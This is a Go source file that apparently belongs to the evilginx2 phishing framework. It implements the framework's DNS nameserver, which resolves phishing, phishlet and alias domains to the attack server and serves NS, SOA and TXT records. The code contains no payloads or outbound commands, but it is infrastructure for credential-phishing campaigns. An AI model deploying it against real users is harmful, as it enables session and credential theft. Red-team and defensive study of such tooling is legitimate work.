package core

import (
	"net"
	"strconv"
	"strings"
	"time"

	"github.com/miekg/dns"

	"github.com/kgretzky/evilginx2/log"
)

type Nameserver struct {
	srv    *dns.Server
	cfg    *Config
	serial uint32
	txt    map[string]TXTField
}

type TXTField struct {
	fqdn  string
	value string
	ttl   int
}

func NewNameserver(cfg *Config) (*Nameserver, error) {
	n := &Nameserver{
		serial: uint32(time.Now().Unix()),
		cfg:    cfg,
	}
	n.txt = make(map[string]TXTField)

	n.Reset()

	return n, nil
}

func (n *Nameserver) Reset() {
	registered := make(map[string]bool)
	// Handle baseDomain
	dns.HandleFunc(pdom(n.cfg.baseDomain), n.handleRequest)
	registered[n.cfg.baseDomain] = true
	// Multi-domain: handle all per-phishlet domains
	for _, dom := range n.cfg.GetAllDomains() {
		if dom != "" && !registered[dom] {
			dns.HandleFunc(pdom(dom), n.handleRequest)
			registered[dom] = true
			log.Debug("nameserver: registered domain: %s", dom)
		}
	}
	// Multi-domain: handle all alias domains
	for site := range n.cfg.phishlets {
		for _, aliasDom := range n.cfg.GetSiteAliases(site) {
			if aliasDom != "" && !registered[aliasDom] {
				dns.HandleFunc(pdom(aliasDom), n.handleRequest)
				registered[aliasDom] = true
				log.Debug("nameserver: registered alias domain: %s", aliasDom)
			}
		}
	}
}

func (n *Nameserver) Start() {
	go func() {
		n.srv = &dns.Server{Addr: ":53", Net: "udp"}
		if err := n.srv.ListenAndServe(); err != nil {
			log.Fatal("Failed to start nameserver on port 53")
		}
	}()
}

func (n *Nameserver) AddTXT(fqdn, value string, ttl int) {
	txt := TXTField{
		fqdn:  fqdn,
		value: value,
		ttl:   ttl,
	}
	n.txt[fqdn] = txt
}

func (n *Nameserver) ClearTXT() {
	n.txt = make(map[string]TXTField)
}

func (n *Nameserver) handleRequest(w dns.ResponseWriter, r *dns.Msg) {
	m := new(dns.Msg)
	m.SetReply(r)

	if n.cfg.baseDomain == "" || n.cfg.serverIP == "" {
		return
	}

	// Multi-domain: determine which domain this query belongs to
	queryName := strings.ToLower(r.Question[0].Name)
	soaDomain := n.cfg.baseDomain
	for _, dom := range n.cfg.GetAllDomains() {
		if dom != "" && strings.HasSuffix(queryName, pdom(dom)) {
			soaDomain = dom
			break
		}
	}
	// Check alias domains too
	for site := range n.cfg.phishlets {
		for _, aliasDom := range n.cfg.GetSiteAliases(site) {
			if aliasDom != "" && strings.HasSuffix(queryName, pdom(aliasDom)) {
				soaDomain = aliasDom
				break
			}
		}
	}

	soa := &dns.SOA{
		Hdr:     dns.RR_Header{Name: pdom(soaDomain), Rrtype: dns.TypeSOA, Class: dns.ClassINET, Ttl: 300},
		Ns:      "ns1." + pdom(soaDomain),
		Mbox:    "hostmaster." + pdom(soaDomain),
		Serial:  n.serial,
		Refresh: 900,
		Retry:   900,
		Expire:  1800,
		Minttl:  60,
	}
	m.Ns = []dns.RR{soa}

	switch r.Question[0].Qtype {
	case dns.TypeA:
		log.Debug("DNS A: " + queryName + " = " + n.cfg.serverIP)
		rr := &dns.A{
			Hdr: dns.RR_Header{Name: m.Question[0].Name, Rrtype: dns.TypeA, Class: dns.ClassINET, Ttl: 300},
			A:   net.ParseIP(n.cfg.serverIP),
		}
		m.Answer = append(m.Answer, rr)
	case dns.TypeNS:
		log.Debug("DNS NS: " + queryName)
		// Respond to NS queries for any managed domain
		for _, dom := range append(n.cfg.GetAllDomains(), n.cfg.baseDomain) {
			if dom != "" && strings.EqualFold(r.Question[0].Name, pdom(dom)) {
				for _, i := range []int{1, 2} {
					rr := &dns.NS{
						Hdr: dns.RR_Header{Name: pdom(dom), Rrtype: dns.TypeNS, Class: dns.ClassINET, Ttl: 300},
						Ns:  "ns" + strconv.Itoa(i) + "." + pdom(dom),
					}
					m.Answer = append(m.Answer, rr)
				}
				break
			}
		}
	case dns.TypeTXT:
		log.Debug("DNS TXT: " + strings.ToLower(r.Question[0].Name))
		txt, ok := n.txt[strings.ToLower(m.Question[0].Name)]

		if ok {
			rr := &dns.TXT{
				Hdr: dns.RR_Header{Name: m.Question[0].Name, Rrtype: dns.TypeTXT, Class: dns.ClassINET, Ttl: uint32(txt.ttl)},
				Txt: []string{txt.value},
			}
			m.Answer = append(m.Answer, rr)
		}
	}
	err := w.WriteMsg(m)
	if err != nil {
		log.Error("dns writeMsg: %v", err)
	}
}

func pdom(domain string) string {
	return domain + "."
}
